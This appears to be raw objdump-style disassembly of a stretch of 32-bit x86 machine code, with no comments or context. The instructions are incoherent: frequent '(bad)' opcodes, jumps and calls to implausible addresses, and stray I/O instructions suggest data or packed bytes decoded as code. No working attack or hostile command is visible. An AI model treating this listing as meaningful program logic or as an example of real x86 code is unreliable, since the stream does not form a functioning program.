  40e33d:	stos   BYTE PTR es:[edi],al
  40e33e:	fcomi  st,st(7)
  40e340:	and    ebp,edx
  40e342:	jno    0x40e34b
  40e344:	add    DWORD PTR [edi+0x29],edx
  40e347:	xchg   ecx,eax
  40e348:	dec    eax
  40e349:	xor    ebx,DWORD PTR [esi-0x44]
  40e34c:	jle    0x40e3a9
  40e34e:	ss xchg ecx,eax
  40e350:	xor    eax,0xe17325b3
  40e355:	stos   BYTE PTR es:[edi],al
  40e356:	adc    edx,edi
  40e358:	addr16 pop ebx
  40e35a:	push   ds
  40e35b:	xchg   ecx,eax
  40e35c:	inc    ebp
  40e35d:	mov    bl,0x51
  40e35f:	jae    0x40e32a
  40e361:	stos   BYTE PTR es:[edi],al
  40e362:	pop    ebx
  40e363:	jno    0x40e365
	...
  40e38d:	add    ah,bh
  40e38f:	test   eax,0xdcb0705
  40e394:	int    0xb1
  40e396:	add    DWORD PTR [ebx-0x55568d0b],esi
  40e39c:	cwde   
  40e39d:	push   es
  40e39e:	sub    ecx,DWORD PTR [ebx+0x39]
  40e3a1:	pop    es
  40e3a2:	adc    edx,DWORD PTR [ebx-0x2f]
  40e3a5:	or     DWORD PTR [eax-0x7be42a56],edx
  40e3ab:	fcmove st,st(5)
  40e3ad:	push   es
  40e3ae:	xchg   ebp,eax
  40e3af:	push   ds
  40e3b0:	je     0x40e373
  40e3b2:	and    eax,0x704f63d4
  40e3b7:	stos   BYTE PTR es:[edi],al
  40e3b8:	mov    ch,0x6
  40e3ba:	repz dec edx
  40e3bc:	scas   al,BYTE PTR es:[edi]
  40e3bd:	push   eax
  40e3be:	stos   BYTE PTR es:[edi],al
  40e3bf:	test   eax,0x106606a5
  40e3c4:	sbb    eax,0xa9563e04
  40e3c9:	(bad)  
  40e3ca:	and    DWORD PTR [ebx],esi
  40e3cc:	outs   dx,BYTE PTR ds:[esi]
  40e3cd:	mov    ebx,0x90865afe
  40e3d2:	inc    ebp
  40e3d3:	mov    bl,0xd
  40e3d5:	jae    0x40e408
  40e3d7:	stos   BYTE PTR es:[edi],al
  40e3d8:	push   DWORD PTR [ebp-0x72]
  40e3db:	out    dx,eax
  40e3dc:	std    
  40e3dd:	outs   dx,BYTE PTR ds:[esi]
  40e3de:	cmp    BYTE PTR [ebx],cl
  40e3e0:	call   0xfeeb7083
  40e3e5:	mov    ecx,0xe174a8cd
  40e3ea:	and    eax,0x384efe2b
  40e3ef:	mov    bl,0xb4
  40e3f1:	jbe    0x40e3f3
	...
  40e41b:	add    BYTE PTR [eax-0x56],al
  40e41e:	mov    WORD PTR [edi+edi*2-0x57],fs
  40e422:	(bad)  
  40e423:	lods   eax,DWORD PTR ss:[esi]
  40e425:	test   al,0xb4
  40e427:	ins    DWORD PTR es:[edi],dx
  40e428:	cmp    ebp,DWORD PTR [edx+0x24e211fe]
  40e42e:	add    cl,ch
  40e430:	mov    esi,0xd56c0e9a
  40e435:	test   al,0xfe
  40e437:	push   cs
  40e438:	cmp    al,dh
  40e43a:	mov    ebx,0xe7aa4007
  40e43f:	aad    0xc4
  40e441:	test   eax,0xe2f9f6fe
  40e446:	std    
  40e447:	out    dx,al
  40e448:	cmp    esi,DWORD PTR [ebx-0x55bc897c]
  40e44e:	enter  0x96ab,0xa9
  40e452:	push   ebx
  40e453:	bound  esp,QWORD PTR [esi]
  40e455:	fadd   st(3),st
  40e457:	cdq    
  40e458:	cmp    BYTE PTR [edx-0x1d065102],ch
  40e45e:	std    
  40e45f:	mov    esi,0xe9005b3b
  40e464:	cmp    eax,0x66dd44d6
  40e469:	jmp    0x62fed0e1
  40e46e:	add    BYTE PTR [ecx+edx*2],dl
  40e471:	mov    dl,0x8
  40e473:	call   0x8aa93fb5
  40e478:	mov    ebx,DWORD PTR [edx]
  40e47a:	add    BYTE PTR [eax],al
  40e47c:	rcr    al,0xa
  40e47f:	call   0x40e484
	...
  40e4a8:	add    BYTE PTR [eax],al
  40e4aa:	shr    BYTE PTR ds:0x289effff,0xb8
  40e4b1:	(bad)  
  40e4b2:	nop
  40e4b3:	pop    esi
  40e4b4:	push   0x5d263e
  40e4b9:	lea    ebx,[edx+0x70fffe1d]
  40e4bf:	out    dx,eax
  40e4c0:	out    0x67,al
  40e4c2:	pusha  
  40e4c3:	pop    esi
  40e4c4:	dec    DWORD PTR [ebp-0x1e296]
  40e4ca:	xor    bh,ch
  40e4cc:	std    
  40e4cd:	mov    ch,0x6f
  40e4cf:	popa   
  40e4d0:	(bad)  
  40e4d1:	(bad)  
  40e4d2:	jg     0x40e508
  40e4d4:	jp     0x40e4d6
  40e4d6:	out    0x25,eax
  40e4d8:	test   DWORD PTR [ecx+esi*1-0x1fbf00a2],edi
  40e4df:	sub    dh,al
  40e4e1:	add    bh,dl
  40e4e3:	pop    esp
  40e4e4:	lea    edx,[ebp-0x9e9b]
  40e4ea:	test   al,0x5a
  40e4ec:	adc    BYTE PTR [eax],al
  40e4ee:	xchg   edi,eax
  40e4ef:	pop    esp
  40e4f0:	je     0x4143f6
  40e4f6:	adc    bh,BYTE PTR [ecx]
  40e4f8:	ret    0x70fe
  40e4fb:	pop    edi
  40e4fc:	lea    eax,[edx+0x43]
  40e4ff:	out    dx,eax
  40e500:	data16 fisub WORD PTR [eax]
  40e503:	pushf  
  40e504:	(bad)  
  40e505:	out    0x13,eax
  40e507:	aad    0xfe
  40e509:	jmp    FWORD PTR [esp+ebx*1+0x75]
  40e50d:	add    al,BYTE PTR [eax]
	...
  40e537:	add    BYTE PTR [ecx+ebx*8-0x75],bh
  40e53b:	xchg   ebp,eax
  40e53c:	xchg   ebp,eax
  40e53d:	pop    esi
  40e53e:	(bad)  
  40e53f:	call   edx
  40e541:	cdq    
  40e542:	sub    dl,BYTE PTR [eax+0x2f]
  40e545:	jg     0x40e596
  40e547:	inc    ecx
  40e548:	ds mov dl,0x1a
  40e54b:	push   edx
  40e54c:	les    esi,FWORD PTR [ecx-0x5901f4fe]
  40e552:	add    bl,ch
  40e554:	xchg   ebp,eax
  40e555:	aaa    
  40e556:	outs   dx,BYTE PTR ds:[esi]
  40e557:	ret    0x3128
  40e55a:	add    al,0x8d
  40e55c:	jl     0x40e544
  40e55e:	jns    0x40e4e5
  40e560:	sar    BYTE PTR [edi],cl
  40e562:	add    al,0xff
  40e564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e565:	sub    DWORD PTR [ebx-0x71eec1c0],edi
  40e56b:	or     edx,DWORD PTR [esi]
  40e56d:	icebp  
  40e56e:	jo     0x40e56f
  40e570:	stc    
  40e571:	and    BYTE PTR [esi-0x4c],cl
  40e574:	lock push 0x10d65004
  40e57a:	jno    0x40e57b
  40e57c:	loope  0x40e5b8
  40e57e:	jle    0x40e530
  40e580:	fadd   DWORD PTR [eax+0x41665004]
  40e586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e587:	inc    eax
  40e588:	ds push ecx
  40e58a:	dec    esi
  40e58b:	mov    al,0xc0
  40e58d:	pop    eax
  40e58e:	add    al,0xe8
  40e590:	inc    edi
  40e591:	fld    QWORD PTR [edx]
  40e593:	add    BYTE PTR [ebp+0x72],al
  40e596:	(bad)  
  40e597:	adc    dl,BYTE PTR [esi]
  40e599:	aas    
  40e59a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e59b:	inc    eax
	...
  40e5c4:	add    BYTE PTR [eax],al
  40e5c6:	ds mov ecx,0xc098b04c
  40e5cc:	add    bh,bh
  40e5ce:	or     ebp,DWORD PTR [edx-0x6f748716]
  40e5d4:	add    ch,al
  40e5d6:	pop    es
  40e5d7:	or     BYTE PTR [ebx],al
  40e5d9:	dec    ebx
  40e5db:	ss (bad) 
  40e5dd:	std    
  40e5de:	jno    0x40e5c8
  40e5e0:	push   ebx
  40e5e1:	push   DWORD PTR [ebx+0x61ff022d]
  40e5e7:	cdq    
  40e5e8:	call   0xe99c2465
  40e5ed:	mov    BYTE PTR [ecx+0x49496457],dl
  40e5f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5f4:	xchg   ebp,eax
  40e5f5:	add    ecx,DWORD PTR [ebx+0x39038ee6]
  40e5fb:	mov    ah,0xa0
  40e5fd:	jge    0x40e63d
  40e5ff:	pop    ebx
  40e600:	jle    0x40e5bb
  40e602:	icebp  
  40e603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e604:	jne    0x40e609
  40e606:	push   ss
  40e607:	adc    eax,0x9519035f
  40e60c:	sub    cl,BYTE PTR [esi+edi*1]
  40e60f:	adc    BYTE PTR [edx-0x10],dh
  40e612:	or     BYTE PTR [ecx],dh
  40e614:	in     eax,0xeb
  40e616:	scas   eax,DWORD PTR es:[edi]
  40e617:	leave  
  40e618:	dec    ebp
  40e619:	add    eax,DWORD PTR [ebp-0x65]
  40e61c:	mov    esp,0x3e0b8e12
  40e621:	jns    0x40e659
  40e623:	mov    bl,0x81
  40e625:	add    ah,cl
  40e627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e628:	inc    eax
  40e629:	sub    eax,DWORD PTR [eax]
	...
  40e653:	add    al,cl
  40e655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e656:	and    eax,0xe953ffcd
  40e65b:	pop    eax
  40e65c:	mov    ch,0xb7
  40e65e:	imul   ecx,eax,0x6de931c5
  40e664:	pop    edi
  40e665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e666:	jnp    0x40e673
  40e668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e669:	adc    al,0x72
  40e66b:	add    ebp,DWORD PTR [ecx+0x17ffabd4]
  40e671:	inc    ecx
  40e672:	out    dx,al
  40e673:	js     0x40e6bb
  40e675:	mov    bl,0xa5
  40e677:	add    dl,BYTE PTR [ecx-0x76d8ad5a]
  40e67d:	xor    cl,ah
  40e67f:	jmp    0x40e64b
  40e681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e682:	int    0x2
  40e684:	in     al,0x46
  40e686:	(bad)  
  40e687:	js     0x40e6cf
  40e689:	mov    bl,0x91
  40e68b:	add    ch,BYTE PTR [ecx-0x5a]
  40e68e:	inc    DWORD PTR [edx+0x3a]
  40e691:	xor    ebp,DWORD PTR [edi+0x685b030c]
  40e697:	jle    0x40e677
  40e699:	sbb    eax,DWORD PTR [eax]
  40e69b:	sahf   
  40e69c:	push   es
  40e69d:	call   0x79f0:0xb33a2847
  40e6a4:	cmp    al,0xa6
  40e6a6:	or     ch,BYTE PTR [ecx+0x11504fa9]
  40e6ac:	iret   
  40e6ad:	push   es
  40e6ae:	inc    ecx
  40e6af:	jmp    0xe1b58d41
  40e6b4:	and    eax,0x66fb9b
	...
  40e6e1:	add    BYTE PTR [ebx+esi*4],bh
  40e6e4:	shr    BYTE PTR [esp+edi*1-0x5a],0x69
  40e6e9:	jmp    0xa89dcd83
  40e6ee:	cmp    eax,0x7aa49733
  40e6f3:	pop    ebx
  40e6f4:	push   esp
  40e6f6:	add    BYTE PTR [esi],bl
  40e6f8:	inc    ecx
  40e6f9:	jmp    0x2ed082d3
  40e6fe:	cmp    al,0x52
  40e700:	rcr    BYTE PTR [ebp+0x6c680b29],0x5e
  40e707:	sbb    al,0x0
  40e709:	mov    ecx,0x108303c
  40e70e:	shl    DWORD PTR [ecx-0x345af902],cl
  40e714:	mov    esi,?
  40e716:	aas    
  40e717:	xor    DWORD PTR [eax],eax
  40e719:	cmp    DWORD PTR ds:0x28cd133,0x5b
  40e720:	push   0x805b3de9
  40e725:	shl    DWORD PTR [edi+0x33d6fed5],1
  40e72b:	fwait
  40e72c:	jae    0x40e733
  40e72e:	adc    cl,BYTE PTR [ebx]
  40e730:	call   0xfe050835
  40e735:	jmp    FWORD PTR [ecx+ebx*4+0x72]
  40e739:	adc    al,0x47
  40e73b:	aaa    
  40e73c:	lea    ebx,[ebp+0x26]
  40e73f:	pop    edi
  40e740:	push   eax
  40e741:	push   DWORD PTR [edx]
  40e743:	push   edi
  40e744:	call   0x40e7a5
	...
  40e76d:	add    BYTE PTR [eax],al
  40e76f:	add    BYTE PTR [ebx+0xbe8ff5b],ch
  40e775:	(bad)  
  40e776:	std    
  40e777:	(bad)  
  40e778:	mov    edi,0xb8ff8d02
  40e77d:	pop    edx
  40e77e:	jne    0x40e77c
  40e780:	test   al,0x2c
  40e782:	or     al,ch
  40e784:	fst    st(5)
  40e786:	std    
  40e787:	(bad)  
  40e788:	ficomp WORD PTR [ebp-0x282dfffe]
  40e78e:	jmp    0x68ff:0xf5ab6381
  40e795:	aam    0x43
  40e797:	cld    
  40e798:	mov    bh,0x5b
  40e79a:	jne    0x40e7ac
  40e79c:	js     0x40e7ca
  40e79e:	or     al,0xe8
  40e7a0:	cmc    
  40e7a1:	and    DWORD PTR [eax],eax
  40e7a3:	add    ah,bl
  40e7a5:	cwde   
  40e7a6:	or     eax,0x5f1c85
  40e7ab:	add    BYTE PTR [eax],ah
  40e7ad:	sbb    al,0xf8
  40e7af:	add    bh,dl
  40e7b1:	pop    eax
  40e7b2:	add    bh,al
  40e7b4:	xchg   edx,eax
  40e7b5:	lods   al,BYTE PTR ds:[esi]
  40e7b6:	std    
  40e7b7:	pop    es
  40e7b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7b9:	pop    eax
  40e7ba:	push   0x0
  40e7bc:	int    0x58
  40e7be:	push   0x0
  40e7c0:	int    0x58
  40e7c2:	lea    eax,[ebp-0x5d]
  40e7c5:	or     BYTE PTR [ebp-0x25c6c7b],cl
  40e7cb:	call   DWORD PTR [edi+0x5a]
  40e7ce:	jne    0x40e7c8
  40e7d0:	push   0xe8fc2d
	...
  40e7fd:	add    BYTE PTR [esi],bh
  40e7ff:	inc    esi
  40e800:	jnp    0x40e802
  40e802:	ds mov ecx,0x8b3b73c2
  40e808:	nop
  40e809:	jmp    FWORD PTR [ecx-0x4e]
  40e80c:	push   0xffffff9f
  40e80e:	div    BYTE PTR [edx+0x4]
  40e811:	call   ebx
  40e813:	sub    edx,0xfffdae84
  40e819:	dec    edi
  40e81a:	mov    ch,0xe2
  40e81c:	lea    eax,[edx+ecx*2-0x7101003b]
  40e823:	pusha  
  40e824:	in     al,dx
  40e825:	je     0x40e7f5
  40e827:	fdiv   st(7),st
  40e829:	mov    bl,al
  40e82b:	and    eax,edi
  40e82d:	(bad)  
  40e82e:	and    edx,ebx
  40e830:	retf   
  40e831:	mov    ebx,DWORD PTR [ecx]
  40e833:	xor    eax,0xa5a6006d
  40e838:	pusha  
  40e839:	inc    ecx
  40e83a:	ds add eax,0xd09efb6
  40e840:	add    bh,bh
  40e842:	jae    0x40e7ca
  40e844:	jmp    0xc389:0x1cc1cd
  40e84b:	adc    eax,0x30e1fef8
  40e850:	mov    esi,0x74d1eb
  40e855:	add    BYTE PTR [edx-0x5f],cl
  40e858:	push   0x1
  40e85a:	ds push ebp
  40e85c:	sar    esi,0x8b
  40e85f:	pop    ebp
  40e860:	clc    
  40e861:	inc    BYTE PTR [eax]
	...
  40e88b:	add    BYTE PTR [ecx-0x59f789ac],bh
  40e891:	fnstenv [esi+edi*8-0x144b5b57]
  40e898:	test   eax,0xc7e7feac
  40e89d:	add    eax,0x5a91ff00
  40e8a2:	pushf  
  40e8a3:	hlt    
  40e8a4:	nop
  40e8a5:	mov    ds:0x570affdd,eax
  40e8aa:	(bad)  
  40e8ab:	jns    0x40e8f3
  40e8ad:	mov    bl,0x18
  40e8af:	push   DWORD PTR [eax-0x5d]
  40e8b2:	lds    edi,FWORD PTR [ecx-0x4254a7]
  40e8b8:	pop    ecx
  40e8b9:	xor    eax,0xa358ff65
  40e8be:	and    edi,esp
  40e8c0:	pushw  ds
  40e8c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8c3:	dec    DWORD PTR [eax-0x5d]
  40e8c6:	adc    eax,DWORD PTR [eax]
  40e8c8:	push   esi
  40e8c9:	rcl    DWORD PTR [eax],1
  40e8cb:	add    al,0x3e
  40e8cd:	xchg   esp,eax
  40e8ce:	stos   BYTE PTR es:[edi],al
  40e8cf:	adc    BYTE PTR [esi],bh
  40e8d1:	or     BYTE PTR [edx-0x10],dh
  40e8d4:	mov    esi,0x20f79097
  40e8d9:	mov    ds:0xc1a4963,eax
  40e8de:	outs   dx,BYTE PTR ds:[esi]
  40e8df:	jns    0x40e90f
  40e8e1:	mov    ds:0x2f160fdb,al
  40e8e6:	loope  0x40e8eb
  40e8e8:	ds push esi
  40e8ea:	sub    DWORD PTR [edi],ecx
  40e8ec:	ret    
  40e8ed:	inc    ecx
  40e8ee:	call   0x40e8f6
	...
  40e917:	add    BYTE PTR [eax],al
  40e919:	add    BYTE PTR [esi],bh
  40e91b:	call   0x3e8:0xa2e9fbab
  40e922:	stc    
  40e923:	sbb    BYTE PTR ds:0xe95b40ff,bh
  40e929:	imul   edi,DWORD PTR [esi],0x3e69e935
  40e92f:	xor    eax,0xa77a90e9
  40e934:	mov    eax,0x15a7c290
  40e939:	push   DWORD PTR [eax-0x5986f9f5]
  40e93f:	mov    ds:0x1899ff73,al
  40e944:	add    BYTE PTR [ecx+0x3d],dh
  40e947:	pop    ebx
  40e948:	or     ebp,DWORD PTR [ecx]
  40e94a:	push   ss
  40e94b:	pop    eax
  40e94c:	jmp    0x9c2719
  40e951:	push   ecx
  40e952:	mov    eax,ds:0x78e9411a
  40e957:	daa    
  40e958:	adc    cl,al
  40e95a:	retf   
  40e95b:	sar    esi,1
  40e95d:	(bad)  
  40e95e:	or     eax,0xb66ccfd6
  40e963:	scas   al,BYTE PTR es:[edi]
  40e964:	div    BYTE PTR [esi-0x3eadeda8]
  40e96a:	mov    ebx,0xbaa6fed1
  40e96f:	xlat   BYTE PTR ds:[ebx]
  40e970:	out    dx,eax
  40e971:	xchg   esi,eax
  40e972:	inc    eax
  40e973:	mov    eax,ds:0xa0c4b5e7
  40e978:	inc    BYTE PTR [ebx]
  40e97a:	cmp    dh,BYTE PTR ds:0x8600
	...
  40e9a8:	out    0xb1,al
  40e9aa:	idiv   BYTE PTR [esi+0x20]
  40e9ad:	mov    eax,ds:0xbc25e574
  40e9b2:	lea    ebp,[esi+0x10]
  40e9b5:	rol    DWORD PTR [ebp+edx*2+0x5efea110],cl
  40e9bc:	(bad)  
  40e9bd:	mov    ch,0xf6
  40e9bf:	push   esi
  40e9c0:	clc    
  40e9c1:	mov    ecx,0xa0f0748a
  40e9c6:	or     ch,BYTE PTR [ecx]
  40e9c8:	jno    0x40ea08
  40e9ca:	push   eax
  40e9cb:	jo     0x40e983
  40e9cd:	mov    ecx,0xa0d836f6
  40e9d2:	mov    ah,0x41
  40e9d4:	enter  0xfea0,0x11
  40e9d8:	cmc    
  40e9d9:	sar    esi,1
  40e9db:	push   ds
  40e9dc:	xor    al,0x9b
  40e9de:	jae    0x40e981
  40e9e0:	and    eax,0xf2fe005d
  40e9e5:	cmp    DWORD PTR [ebx+0x16e100],ebx
  40e9eb:	jmp    FWORD PTR [edx-0x4a]
  40e9ee:	cmc    
  40e9ef:	call   DWORD PTR [eax+0x3f08739f]
  40e9f5:	pop    ds
  40e9f6:	mov    ah,0xff
  40e9f8:	mov    al,ds:0x7000022e
  40e9fd:	loopne 0x40ea65
  40e9ff:	stos   DWORD PTR es:[edi],eax
  40ea00:	xor    DWORD PTR [esi],ebx
  40ea02:	add    bh,bh
  40ea04:	retf   0xf5ae
  40ea07:	inc    DWORD PTR [eax+0x8739f]
	...
  40ea35:	add    BYTE PTR [edi-0x6f004bc3],cl
  40ea3b:	add    BYTE PTR cs:[eax],al
  40ea3e:	nop
  40ea3f:	loopne 0x40eaa7
  40ea41:	out    dx,eax
  40ea42:	add    bl,BYTE PTR [esi]
  40ea44:	add    bh,bh
  40ea46:	jmp    0x739e:0xd0fff5ae
  40ea4d:	or     BYTE PTR [edi-0x3f004bec],bh
  40ea53:	scas   eax,DWORD PTR es:[edi]
  40ea54:	push   eax
  40ea55:	mov    esp,DWORD PTR [eax-0x3c4a0262]
  40ea5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea5c:	std    
  40ea5d:	(bad)  
  40ea5e:	mov    edi,0xa0ff8b16
  40ea63:	sahf   
  40ea64:	mov    bl,0xf0
  40ea66:	push   0x1afffd9e
  40ea6b:	push   ecx
  40ea6c:	push   DWORD PTR [ebp-0x21]
  40ea6f:	mov    ah,0xdb
  40ea71:	inc    BYTE PTR [eax+0x27b5fd9e]
  40ea77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea78:	std    
  40ea79:	(bad)  
  40ea7a:	jg     0x40eaee
  40ea7c:	mov    edi,edi
  40ea7e:	and    BYTE PTR [esi-0x53d107bd],bl
  40ea84:	cld    
  40ea85:	jmp    DWORD PTR [eax]
  40ea87:	sahf   
  40ea88:	jae    0x40ea86
  40ea8a:	ds pop edx
  40ea8c:	inc    ebp
  40ea8d:	ja     0x40eacd
  40ea8f:	mov    dl,0xc9
  40ea91:	sar    DWORD PTR [edx],0xb2
  40ea94:	push   ebp
  40ea95:	mov    edx,DWORD PTR [edx+0xfbc835]
	...
  40eac3:	add    BYTE PTR [edx+esi*4],ah
  40eac6:	push   0xb279122
  40eacb:	call   0xff3d151b
  40ead0:	mov    bh,0x77
  40ead2:	add    BYTE PTR [eax+0x3e],ch
  40ead5:	mov    dl,0xeb
  40ead7:	mov    ebp,0x415de0e6
  40eadc:	ds or  bh,ch
  40eadf:	pop    esp
  40eae0:	push   DWORD PTR [ecx-0x65b98b05]
  40eae6:	sub    dh,BYTE PTR [ecx+edx*2-0x17f8950f]
  40eaed:	jb     0x40eaf3
  40eaef:	dec    DWORD PTR [ebx]
  40eaf1:	cmc    
  40eaf2:	dec    edx
  40eaf3:	inc    ecx
  40eaf4:	ds leave 
  40eaf6:	jne    0x40eb00
  40eaf8:	es and bh,dh
  40eafb:	(bad)  
  40eafc:	sub    DWORD PTR [edx+0x5],ecx
  40eaff:	pop    esi
  40eb00:	jg     0x40eab4
  40eb02:	push   0x2
  40eb04:	ds mov dl,0x82
  40eb07:	dec    BYTE PTR [ebx+0xb7deaba]
  40eb0d:	cmp    esp,edi
  40eb0f:	addr16 and eax,0x660041e0
  40eb15:	mov    ah,0x2
  40eb17:	add    BYTE PTR [esi-0x29f789f0],bh
  40eb1d:	cld    
  40eb1e:	cld    
  40eb1f:	(bad)  
  40eb20:	loope  0x40eaab
  40eb22:	push   edi
  40eb23:	pop    esi
  40eb24:	jg     0x40ead8
  40eb26:	push   0x2
	...
  40eb50:	add    BYTE PTR [eax],al
  40eb52:	ds mov dl,0x82
  40eb55:	(bad)  
  40eb56:	push   ebx
  40eb57:	pop    ebx
  40eb58:	icebp  
  40eb59:	jmp    0x40ebd1
  40eb5b:	mov    eax,ds:0x25b8fc1d
  40eb60:	adc    eax,0x1532afc
  40eb65:	push   ss
  40eb66:	mov    dh,0x9f
  40eb68:	add    eax,0xe9567fca
  40eb6d:	push   esi
  40eb6e:	lds    ebp,FWORD PTR [esi-0x4cbd8a0b]
  40eb74:	or     BYTE PTR [ebp-0x3c0e6078],cl
  40eb7a:	or     eax,0x1bd05162
  40eb7f:	sbb    ch,cl
  40eb81:	push   ebx
  40eb82:	cs pop di
  40eb85:	sti    
  40eb86:	push   0x3e6c190a
  40eb8b:	pop    ebx
  40eb8c:	into   
  40eb8d:	mov    edx,0x4516e7e1
  40eb92:	or     ebp,DWORD PTR ds:[esi+0x3eb33671]
  40eb99:	mov    bh,0x40
  40eb9b:	lahf   
  40eb9c:	inc    eax
  40eb9d:	ins    BYTE PTR es:[edi],dx
  40eb9e:	aas    
  40eb9f:	pop    ebx
  40eba0:	xchg   BYTE PTR [edx+0x452e9599],bh
  40eba6:	or     eax,DWORD PTR ds:[esi+0x2ab33671]
  40ebad:	mov    bh,0x18
  40ebaf:	lahf   
  40ebb0:	or     BYTE PTR [edi-0x3c],0x9e
  40ebb4:	ins    DWORD PTR es:[edi],dx
  40ebb5:	int    0x0
	...
  40ebdf:	add    bh,bh
  40ebe1:	push   ebx
  40ebe2:	jmp    0x69f0a137
  40ebe7:	shl    ch,0x31
  40ebea:	jmp    0xd3df095c
  40ebef:	or     edx,esi
  40ebf1:	xor    BYTE PTR [esi-0x5],ch
  40ebf4:	loopne 0x40ebca
  40ebf6:	mov    ds:0x4167f7,eax
  40ebfb:	ss dec edi
  40ebfd:	push   ebx
  40ebfe:	call   0xfedeb157
  40ec03:	xchg   ebx,eax
  40ec04:	sbb    BYTE PTR [esi-0x2e5a0e8c],bl
  40ec0a:	(bad)  
  40ec0b:	push   ss
  40ec0c:	mov    ch,0x34
  40ec0e:	sbb    al,0xe
  40ec10:	das    
  40ec11:	push   ebx
  40ec12:	call   0xfede917f
  40ec17:	dec    BYTE PTR [esi]
  40ec19:	lahf   
  40ec1a:	(bad)  
  40ec1b:	jl     0x40ec62
  40ec1d:	mov    bl,0x86
  40ec1f:	test   WORD PTR [ebp-0x617e5438],bx
  40ec26:	push   ebx
  40ec27:	jb     0x40ec8a
  40ec29:	or     edi,eax
  40ec2b:	in     al,dx
  40ec2c:	(bad)  
  40ec2d:	inc    BYTE PTR [eax-0x17]
  40ec30:	cmp    eax,0x10e9005b
  40ec35:	cmp    dh,0x34
  40ec38:	dec    edx
  40ec39:	mov    bl,0xc2
  40ec3b:	cmp    eax,0x148b5b3a
  40ec40:	cmp    bl,dl
  40ec42:	imul   ebx
	...
  40ec6c:	add    BYTE PTR [eax],al
  40ec6e:	iret   
  40ec6f:	dec    ebx
  40ec70:	add    edi,DWORD PTR [ecx+0xf01b3c0]
  40ec76:	mov    ebx,0xaf2d5c63
  40ec7b:	pop    eax
  40ec7c:	data16 scas al,BYTE PTR es:[edi]
  40ec7e:	cmp    edi,edi
  40ec80:	(bad)  
  40ec81:	jge    0x40ec11
  40ec83:	dec    edi
  40ec84:	call   0x9c7b7c
  40ec89:	add    DWORD PTR [ecx-0x6a16bf02],edx
  40ec8f:	mov    edx,0xb33da85d
  40ec94:	cmp    DWORD PTR [ebp-0xc],edi
  40ec97:	pushf  
  40ec98:	or     ch,BYTE PTR [ecx]
  40ec9a:	pop    ecx
  40ec9b:	cmp    bh,bh
  40ec9d:	add    BYTE PTR [edx-0x6bea00af],ah
  40eca3:	add    BYTE PTR [ecx+0x0],al
  40eca6:	fiadd  WORD PTR fs:[edx]
  40eca9:	or     edx,DWORD PTR [edi]
  40ecab:	sub    edx,DWORD PTR [ebp-0x1]
  40ecae:	ret    0x5dd4
  40ecb1:	inc    ecx
  40ecb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecb3:	hlt    
  40ecb4:	mov    WORD PTR [eax-0x1a],fs
  40ecb7:	pop    ecx
  40ecb8:	cmp    DWORD PTR ds:0x413a09,0xffffff97
  40ecbf:	sub    cl,BYTE PTR [eax]
  40ecc1:	push   DWORD PTR [edx+0x28]
  40ecc4:	pop    edi
  40ecc5:	inc    ecx
  40ecc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecc7:	lods   al,BYTE PTR ds:[esi]
  40ecc8:	aaa    
  40ecc9:	push   0xffffff97
  40eccb:	das    
  40eccc:	add    edi,edi
  40ecce:	and    dl,cl
  40ecd0:	pop    esi
  40ecd1:	inc    ecx
	...
  40ecfa:	add    BYTE PTR [eax],al
  40ecfc:	addr16 mov ds:0x8713,al
  40ed00:	sub    BYTE PTR [edx],bl
  40ed02:	add    BYTE PTR [ebx-0x3ff4ad5d],al
  40ed08:	and    edi,DWORD PTR [edx-0x1]
  40ed0b:	xor    eax,0x4136e9
  40ed10:	mov    BYTE PTR [ebp-0x71],cl
  40ed13:	pop    edi
  40ed14:	push   ss
  40ed15:	push   edi
  40ed16:	add    esp,0x53
  40ed19:	mov    ds:0x18787713,al
  40ed1e:	add    bh,al
  40ed20:	and    dl,bl
  40ed22:	pop    esi
  40ed23:	inc    ecx
  40ed24:	pop    ss
  40ed25:	pop    ecx
  40ed26:	add    BYTE PTR [eax],al
  40ed28:	pop    ss
  40ed29:	mov    al,0xff
  40ed2b:	inc    edx
  40ed2c:	mov    WORD PTR [esi+0x4fe5c959],ss
  40ed32:	add    BYTE PTR [ebx+0x415ed2da],al
  40ed38:	pop    ss
  40ed39:	pop    ecx
  40ed3a:	je     0x40ed5b
  40ed3c:	cwde   
  40ed3d:	ins    BYTE PTR es:[edi],dx
  40ed3e:	mov    fs,WORD PTR [eax+0x3e]
  40ed41:	repz add bh,bh
  40ed44:	push   ebx
  40ed45:	std    
  40ed46:	pop    eax
  40ed47:	inc    ecx
  40ed48:	ds xor eax,eax
  40ed4b:	add    ebx,ecx
  40ed4d:	xchg   DWORD PTR [edi+0x5f],ebp
  40ed50:	jg     0x40ed04
  40ed52:	mov    edi,0x4192b804
  40ed57:	add    BYTE PTR [esi],bh
  40ed59:	mov    dl,0x2
  40ed5b:	add    BYTE PTR [ebp-0x19],bh
  40ed5e:	mov    ebp,ebx
	...
  40ed88:	add    BYTE PTR [eax],al
  40ed8a:	mov    ebp,0xb552f46e
  40ed8f:	test   DWORD PTR [edx],0xc1e7e0b
  40ed95:	sbb    DWORD PTR [ebx],0xffffffae
  40ed98:	add    dh,BYTE PTR [ebx+edi*1+0x32]
  40ed9c:	cmp    al,0x0
  40ed9e:	adc    esi,DWORD PTR [ebp-0x151a3fd5]
  40eda4:	les    eax,FWORD PTR [edi]
  40eda6:	xor    bh,BYTE PTR ds:[ebx]
  40eda9:	jle    0x40ed95
  40edab:	mov    eax,ds:0x12b83c83
  40edb0:	inc    ebx
  40edb1:	add    BYTE PTR [esi],bh
  40edb3:	pop    edi
